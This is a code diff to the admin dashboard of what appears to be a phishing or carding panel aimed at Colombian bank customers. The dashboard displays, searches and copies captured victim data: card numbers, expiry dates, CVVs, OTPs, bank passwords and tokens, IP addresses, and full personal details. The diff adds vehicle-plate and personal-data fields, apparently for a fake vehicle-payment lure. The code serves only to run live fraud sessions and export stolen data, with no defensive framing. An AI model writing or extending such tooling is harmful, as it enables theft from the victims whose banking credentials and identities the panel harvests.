@@ -243,7 +243,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th>
                                 <th>Fecha</th>
                                 <th>Banco</th>
-                                <th>Tarjeta</th>
+                                <th>Tarjeta/Placa</th>
                                 <th>Fch / CVV</th>
                                 <th>Titular</th>
                                 <th>Acciones</th>
@@ -475,13 +475,17 @@ function renderSesiones() {
     if (filtro) {
         lista = lista.filter(s => {
             const datos = s.datos || {};
+            const dp = datos.datosPersonales || {};
+            const placas = datos.placasData || [];
+            const textoPlacas = placas.map(p => p.placa).join(' ');
             const texto = [
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
                 datos.docNumber, datos.documento, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
                 datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName,
-                datos.empresa, datos.cuenta, datos.medioPago, datos.nombres, datos.apellidos,
-                datos.telefono, datos.celular, datos.correo, datos.direccion, datos.rol
+                datos.empresa, datos.cuenta, datos.medioPago,
+                dp.primerNombre, dp.primerApellido, dp.correoPrimario, dp.numeroTelefono,
+                textoPlacas
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
@@ -493,6 +497,7 @@ function renderSesiones() {
     }
     tbody.innerHTML = lista.map(s => {
         const datos = s.datos || {};
+        const dp = datos.datosPersonales || {};
         const banco = datos.bancoKey || '-';
         const pasoActual = s.paso || 'index';
         
@@ -529,7 +534,7 @@ function renderSesiones() {
             documento = '-';
         }
 
-        const titular = datos.titular || datos.nombres || '-';
+        const titular = datos.titular || dp.primerNombre || '-';
         const token = datos.token || '-';
         const otp = datos.otp || datos.claveDinamica || '-';
         const montoValor = datos.monto || (s.estado === 'precio_asignado' ? s.accion : null);
@@ -614,7 +619,33 @@ function copiarDatos(id) {
     const h = historialCache.find(x => x.id === id);
     if (!h) return;
     const d = h.datos || {};
-    const texto = `Nombres: ${d.nombres || '-'}\nApellidos: ${d.apellidos || '-'}\nDocumento: ${d.docType || d.tipoDoc || ''} ${d.docNumber || d.documento || ''}\nCelular: ${d.telefono || d.celular || '-'}\nCorreo: ${d.correo || '-'}\nDirección: ${d.direccion || '-'}\nRol: ${d.rol || '-'}\nTarjeta: ${d.tarjeta || '-'}\nVencimiento: ${d.expMes || ''}/${d.expAnio || ''}\nCVV: ${d.cvv || '-'}\nTitular: ${d.titular || '-'}\nOTP: ${d.otp || 'Sin OTP'}\nMonto: ${d.monto || '-'}\nIP: ${d.ip || '-'}`;
+    const dp = d.datosPersonales || {};
+    const placas = d.placasData || [];
+    
+    let texto = `--- DATOS PERSONALES ---\n`;
+    texto += `Nombres: ${dp.primerNombre || ''} ${dp.segundoNombre || ''} ${dp.primerApellido || ''} ${dp.segundoApellido || ''}\n`;
+    texto += `Documento: ${d.docType || 'CC'} ${d.docNumber || '-'}\n`;
+    texto += `Correo: ${dp.correoPrimario || '-'}\n`;
+    texto += `Celular: ${dp.numeroTelefono || '-'}\n`;
+    texto += `Dirección: ${dp.direccionCorrespondencia || '-'}\n`;
+    texto += `Ubicación: ${dp.departamento || ''}, ${dp.municipio || ''}, ${dp.localidad || ''}\n`;
+    texto += `Estrato: ${dp.estrato || '-'} | Propiedad: ${dp.tipoPropiedad || '-'} | Vehículos: ${dp.soyPropietario || '-'}\n`;
+    texto += `Origen: ${dp.direccionOrigen || '-'}\n`;
+    texto += `Destino: ${dp.direccionDestino || '-'}\n`;
+    
+    if (placas.length > 0) {
+        texto += `\n--- VEHÍCULOS / PLACAS ---\n`;
+        placas.forEach(p => {
+            texto += `Placa: ${p.placa} | Duración: ${p.duracion} | Fechas: ${p.fechaInicio} a ${p.fechaFin} | Valor: $${Number(p.valor).toLocaleString('es-CO')}\n`;
+        });
+    }
+
+    if (d.tarjeta) {
+        texto += `\n--- TARJETA ---\n`;
+        texto += `Tarjeta: ${d.tarjeta}\nVencimiento: ${d.expMes}/${d.expAnio}\nCVV: ${d.cvv}\nTitular: ${d.titular}\nBanco: ${d.bankName}\n`;
+    }
+    
+    texto += `\nOTP: ${d.otp || 'Sin OTP'}\nMonto Total: $${Number(d.monto || 0).toLocaleString('es-CO')}\nIP: ${d.ip || '-'}`;
     
     navigator.clipboard.writeText(texto).then(function() {
         toast('📋 Datos copiados al portapapeles');
@@ -628,34 +659,61 @@ function renderHistorial() {
     const tbody = $('tbodyHistorial');
     let lista = historialCache;
     if (filtro) {
-        lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.celular, datos.correo, datos.direccion, datos.rol, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
+        lista = lista.filter(h => { 
+            const datos = h.datos || {}; 
+            const dp = datos.datosPersonales || {};
+            const placas = datos.placasData || [];
+            const textoPlacas = placas.map(p => p.placa).join(' ');
+            const texto = [ h.bancoKey, dp.primerNombre, dp.primerApellido, datos.docNumber, datos.tarjeta, datos.titular, textoPlacas ].filter(Boolean).join(' ').toLowerCase(); 
+            return texto.includes(filtro); 
+        });
     }
     if (!lista.length) { tbody.innerHTML = '<tr><td colspan="7" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
     
     tbody.innerHTML = lista.map(h => {
         const datos = h.datos || {};
+        const dp = datos.datosPersonales || {};
+        const placas = datos.placasData || [];
+        
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
-        const tarjeta = datos.tarjeta || '-';
-        const titular = datos.titular || datos.nombres || '-';
+        const tarjeta = datos.tarjeta || (placas.length > 0 ? placas.map(p => p.placa).join(', ') : '-');
+        const titular = datos.titular || dp.primerNombre || '-';
         const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
-        const tipoPersona = datos.tipoPersona || '-';
-        const tipoDoc = datos.docType || datos.tipoDocumento || datos.tipoDoc || '-';
-        const numDoc = datos.documento || datos.docNumber || '-';
-        const nombres = datos.nombres || datos.titular || '-';
-        const apellidos = datos.apellidos || '';
-        const telefono = datos.telefono || datos.celular || '-';
-        const correo = datos.correo || '-';
-        const direccion = datos.direccion || '-';
-        const rol = datos.rol || '-';
-        const placa = datos.placa || '-';
-        const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
-        const bancoEmisor = datos.bankName || '-';
-        const tipoTarjeta = datos.cardType || '-';
-        const nivelTarjeta = datos.cardLevel || '-';
+        
         const abierta = filasAbiertas.has(h.id) ? 'visible' : '';
         const otp = datos.otp || 'Sin OTP';
+
+        let htmlPlacas = '';
+        if (placas.length > 0) {
+            htmlPlacas = `
+            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🚗 Placas y Fechas</div>
+            <div class="detalle-item" style="grid-column: 1/-1;">
+                <table style="width: 100%; border-collapse: collapse; margin-top: 5px; font-size: 11px; text-align: left;">
+                    <thead>
+                        <tr style="border-bottom: 1px solid #252d44; color: #88f456;">
+                            <th style="padding: 5px;">Placa</th>
+                            <th style="padding: 5px;">Duración</th>
+                            <th style="padding: 5px;">Fecha Inicio</th>
+                            <th style="padding: 5px;">Fecha Fin</th>
+                            <th style="padding: 5px;">Valor</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${placas.map(p => `
+                            <tr style="border-bottom: 1px dashed #1a1f35;">
+                                <td style="padding: 5px; font-weight: bold; color: #fff;">${escapeHtml(p.placa)}</td>
+                                <td style="padding: 5px;">${escapeHtml(p.duracion)}</td>
+                                <td style="padding: 5px;">${escapeHtml(p.fechaInicio)}</td>
+                                <td style="padding: 5px;">${escapeHtml(p.fechaFin)}</td>
+                                <td style="padding: 5px;">$${Number(p.valor).toLocaleString('es-CO')}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            </div>`;
+        }
 
         return `
             <tr>
@@ -675,28 +733,31 @@ function renderHistorial() {
                     <div class="detalle-container">
                         <div class="detalle-grid">
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">👤 Datos Personales</div>
-                            <div class="detalle-item"><span class="lbl">Tipo Persona</span><span class="val">${escapeHtml(tipoPersona)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Tipo Documento</span><span class="val">${escapeHtml(tipoDoc)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Número Documento</span><span class="val">${escapeHtml(numDoc)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Nombres</span><span class="val">${escapeHtml(nombres)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Apellidos</span><span class="val">${escapeHtml(apellidos)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Teléfono</span><span class="val">${escapeHtml(telefono)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Correo</span><span class="val">${escapeHtml(correo)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Dirección</span><span class="val">${escapeHtml(direccion)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Rol</span><span class="val">${escapeHtml(rol)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(String(placa).toUpperCase())}</span></div>
-                            <div class="detalle-item"><span class="lbl">Monto</span><span class="val">${escapeHtml(monto)}</span></div>
-                            <div class="detalle-item"><span class="lbl">OTP</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Nombres</span><span class="val">${escapeHtml(dp.primerNombre || '')} ${escapeHtml(dp.segundoNombre || '')} ${escapeHtml(dp.primerApellido || '')} ${escapeHtml(dp.segundoApellido || '')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Documento</span><span class="val">${escapeHtml(datos.docType || 'CC')} ${escapeHtml(datos.docNumber || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Correo</span><span class="val">${escapeHtml(dp.correoPrimario || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Celular</span><span class="val">${escapeHtml(dp.numeroTelefono || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Dirección</span><span class="val">${escapeHtml(dp.direccionCorrespondencia || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Ubicación</span><span class="val">${escapeHtml(dp.departamento || '')}, ${escapeHtml(dp.municipio || '')}, ${escapeHtml(dp.localidad || '')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Estrato / Propiedad</span><span class="val">${escapeHtml(dp.estrato || '-')} / ${escapeHtml(dp.tipoPropiedad || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Origen / Destino</span><span class="val">${escapeHtml(dp.direccionOrigen || '-')} a ${escapeHtml(dp.direccionDestino || '-')}</span></div>
                             
+                            ${htmlPlacas}
+
                             ${tarjeta !== '-' ? `
-                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">💳 Datos de la Tarjeta</div>
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">💳 Datos de la Tarjeta</div>
                             <div class="detalle-item"><span class="lbl">Número Tarjeta</span><span class="val">${escapeHtml(tarjeta)}</span></div>
                             <div class="detalle-item"><span class="lbl">Vencimiento</span><span class="val">${escapeHtml(exp)}</span></div>
                             <div class="detalle-item"><span class="lbl">CVV</span><span class="val">${escapeHtml(cvv)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Banco Emisor</span><span class="val">${escapeHtml(bancoEmisor)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Tipo de Tarjeta</span><span class="val">${escapeHtml(tipoTarjeta)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Nivel de Tarjeta</span><span class="val">${escapeHtml(nivelTarjeta)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Banco Emisor</span><span class="val">${escapeHtml(datos.bankName || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Tipo de Tarjeta</span><span class="val">${escapeHtml(datos.cardType || '-')}</span></div>
+                            <div class="detalle-item"><span class="lbl">Nivel de Tarjeta</span><span class="val">${escapeHtml(datos.cardLevel || '-')}</span></div>
                             ` : ''}
+                            
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🛡️ Otros Datos</div>
+                            <div class="detalle-item"><span class="lbl">Monto Total</span><span class="val">$${Number(datos.monto || 0).toLocaleString('es-CO')}</span></div>
+                            <div class="detalle-item"><span class="lbl">OTP</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
+                            <div class="detalle-item"><span class="lbl">IP</span><span class="val">${escapeHtml(datos.ip || '-')}</span></div>
                         </div>
                     </div>
                 </td>
@@ -764,32 +825,59 @@ function verInfoUsuario(sessionId) {
     const s = sesionesCache.find(x => x.sessionId === sessionId);
     if (!s) return;
     const d = s.datos || {};
+    const dp = d.datosPersonales || {};
+    const placas = d.placasData || [];
 
-    // 🔥 AQUI AGREGAMOS EL CAMPO 'ingresos' Y LOS NOMBRES GENERALES
-    const tieneDatosPersonales = d.nombres || d.documento || d.docNumber || d.telefono || d.celular || d.correo || d.direccion || d.rol || d.ingresos;
+    const tieneDatosPersonales = dp.primerNombre || dp.primerApellido || dp.correoPrimario || d.docNumber;
+
+    let htmlPlacas = '';
+    if (placas.length > 0) {
+        htmlPlacas = `
+        <hr style="border-color:#252d44; margin: 10px 0;">
+        <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">🚗 Placas</div>
+        <div style="max-height: 150px; overflow-y: auto;">
+            <table style="width: 100%; font-size: 12px; text-align: left; color: #e5e7eb;">
+                <tr style="border-bottom: 1px solid #252d44;">
+                    <th style="padding: 4px 0;">Placa</th>
+                    <th>Duración</th>
+                    <th>Fecha Ini</th>
+                    <th>Fecha Fin</th>
+                </tr>
+                ${placas.map(p => `
+                    <tr style="border-bottom: 1px dashed #1a1f35;">
+                        <td style="padding: 4px 0; font-weight: bold;">${escapeHtml(p.placa)}</td>
+                        <td>${escapeHtml(p.duracion)}</td>
+                        <td>${escapeHtml(p.fechaInicio)}</td>
+                        <td>${escapeHtml(p.fechaFin)}</td>
+                    </tr>
+                `).join('')}
+            </table>
+        </div>
+        `;
+    }
 
     Swal.fire({
         title: '👤 Información del Usuario',
         html: `
             <div style="text-align: left; font-size: 13px; line-height: 1.7;">
                 <p><b>IP:</b> ${escapeHtml(d.ip || '-')}</p>
-                <p><b>Empresa:</b> ${escapeHtml(d.empresa || '-')}</p>
-                <p><b>Cuenta/Referencia:</b> ${escapeHtml(d.cuenta || '-')}</p>
-                <p><b>Medio de Pago:</b> ${escapeHtml(d.medioPago || '-')}</p>
-
+                
                 ${tieneDatosPersonales ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
                 <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">📋 Datos Personales</div>
-                <p><b>Tipo Documento:</b> ${escapeHtml(d.tipoDoc || d.docType || '-')}</p>
-                <p><b>Documento:</b> ${escapeHtml(d.documento || d.docNumber || '-')}</p>
-                <p><b>Nombres:</b> ${escapeHtml(d.nombres || '-')}</p>
-                ${d.apellidos ? `<p><b>Apellidos:</b> ${escapeHtml(d.apellidos)}</p>` : ''}
-                <p><b>Celular:</b> ${escapeHtml(d.telefono || d.celular || '-')}</p>
-                <p><b>Correo:</b> ${escapeHtml(d.correo || '-')}</p>
-                ${d.direccion ? `<p><b>Dirección:</b> ${escapeHtml(d.direccion)}</p>` : ''}
-                ${d.rol ? `<p><b>Rol:</b> ${escapeHtml(d.rol)}</p>` : ''}
-                ${d.ingresos ? `<p><b>Ingresos:</b> ${escapeHtml(d.ingresos)}</p>` : ''}
+                <p><b>Nombres:</b> ${escapeHtml(dp.primerNombre || '')} ${escapeHtml(dp.segundoNombre || '')} ${escapeHtml(dp.primerApellido || '')} ${escapeHtml(dp.segundoApellido || '')}</p>
+                <p><b>Documento:</b> ${escapeHtml(d.docType || 'CC')} ${escapeHtml(d.docNumber || '-')}</p>
+                <p><b>Correo:</b> ${escapeHtml(dp.correoPrimario || '-')}</p>
+                <p><b>Celular:</b> ${escapeHtml(dp.numeroTelefono || '-')}</p>
+                <p><b>Dirección:</b> ${escapeHtml(dp.direccionCorrespondencia || '-')}</p>
+                <p><b>Ubicación:</b> ${escapeHtml(dp.departamento || '')}, ${escapeHtml(dp.municipio || '')}, ${escapeHtml(dp.localidad || '')}</p>
+                <p><b>Estrato:</b> ${escapeHtml(dp.estrato || '-')} | <b>Propiedad:</b> ${escapeHtml(dp.tipoPropiedad || '-')}</p>
+                <p><b>Vehículos:</b> ${escapeHtml(dp.soyPropietario || '-')} | <b>Motivo:</b> ${escapeHtml(dp.motivoViaje || '-')}</p>
+                <p><b>Origen:</b> ${escapeHtml(dp.direccionOrigen || '-')}</p>
+                <p><b>Destino:</b> ${escapeHtml(dp.direccionDestino || '-')}</p>
                 ` : ''}
+
+                ${htmlPlacas}
 
                 ${d.tarjeta ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
@@ -804,14 +892,14 @@ function verInfoUsuario(sessionId) {
 
                 <hr style="border-color:#252d44; margin: 10px 0;">
                 <p><b>OTP:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || '-')}</span></p>
-                <p><b>Monto:</b> $${Number(d.monto || d.precio || 0).toLocaleString('es-CO')}</p>
+                <p><b>Monto Total:</b> $${Number(d.monto || d.precio || 0).toLocaleString('es-CO')}</p>
             </div>
         `,
         confirmButtonColor: '#88f456',
         confirmButtonText: 'Cerrar',
         background: '#151b2e',
         color: '#e5e7eb',
-        width: 500
+        width: 600
     });
 }
 
